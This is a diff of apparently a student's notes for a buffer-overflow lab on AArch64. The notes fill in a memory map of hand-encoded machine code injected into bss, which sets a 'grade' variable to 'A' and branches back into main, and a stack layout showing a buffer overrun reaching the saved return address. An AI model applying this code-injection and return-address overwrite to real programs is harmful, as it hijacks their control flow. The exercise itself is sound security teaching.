@@ -126,28 +126,46 @@ Address (in hex) | Description
           420072 | 't'
           420073 | 's'
           420074 | '\0'
-          420075 | adr x0, grade // convert to instructions (each instr will require 4 bytes/entries (32 bits total) in name); we should observe little endian format ??
-          420076 | mov x1,  #0x41
-          420077 | strb w1, [x0]
-          420078 | b #(0x420078 - 0x40089c) // go to print statements in main (moves to address at [current addr] - [imm])
-          420079 | '0'
-          42007a | '0'
-          42007b | '0'
-          42007c | '0'
-          42007d | '0'
-          42007e | '0'
-          42007f | '0'
-          420080 | '0'
-          420081 | '0'
-          420082 | '0'
-          420083 | '0'
-          420084 | '0'
-          420085 | '0'
-          420086 | '0'
-          420087 | '0'
+          420075 | '\0' // pad until at an addr which is a multiple of 4
+          420076 | '\0' // (since instrs must be 4-byte aligned)
+          420077 | '\0'
+          420078 | 60 // adr x0, grade - load addr of grade
+          42007a | fe // note little endian formatting
+          42007b | ff
+          42007c | 10
+          42007d | 21 // mov x1,  #0x41 - get "A"
+          42007e | 08
+          42007f | 80
+          420080 | 52
+          420081 | 01 // strb w1, [x0] - store the "A" in grade
+          420082 | 00
+          420083 | 00
+          420084 | 39
+          420085 | 06 // b #(0x420078 - 0x40089c) - go to print
+          420086 | 82 // statements in main
+          420087 | ff
+          420088 | 17
+          420089 | 78 // address of injected code in bss
+          42008a | 00
+          42008b | 42
+          42008c | 00
+          42008d | 00
+          42008e | 00
+          42008f | 00
+          420090 | 00
 
 Step 2.4 - Stack Section:
 Offset | Description
-     0 |
-     8 |
-    16 |
+     0 | x19
+     8 | x20
+    16 | x21
+    24 | x30
+    32 | buf[0]-buf[7]
+    40 | buf[8]-buf[15]
+    48 | buf[16]-buf[23]
+    56 | buf[24]-buf[31]
+    64 | buf[32]-buf[39]
+    72 | buf[40]-buf[47]
+    80 | getName's x30
+    // note that c and i are stored in bss since they're uninitialised/
+    // zero-initialised
